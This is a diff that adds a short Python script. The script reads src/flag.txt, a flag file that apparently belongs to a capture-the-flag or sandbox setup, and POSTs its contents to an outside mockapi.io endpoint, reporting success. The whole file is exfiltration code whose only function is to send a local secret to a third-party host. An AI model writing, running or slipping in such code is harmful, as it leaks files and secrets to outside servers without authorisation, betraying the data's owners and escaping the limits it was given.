@@ -1,0 +1,21 @@
+import os
+import json
+import urllib.request
+import urllib.parse
+
+# Read the flag
+flag_path = os.path.join(os.path.dirname(__file__), 'src', 'flag.txt')
+with open(flag_path, 'r') as f:
+    flag_content = f.read().strip()
+
+# Send to mock API
+url = 'https://699691bd7d1786436574935f.mockapi.io/ekerk/zin/zin'
+data = json.dumps({'flag': flag_content}).encode('utf-8')
+headers = {'Content-Type': 'application/json'}
+
+req = urllib.request.Request(url, data=data, headers=headers, method='POST')
+try:
+    with urllib.request.urlopen(req) as response:
+        print(f"Flag sent successfully: {response.status}")
+except Exception as e:
+    print(f"Error: {e}")
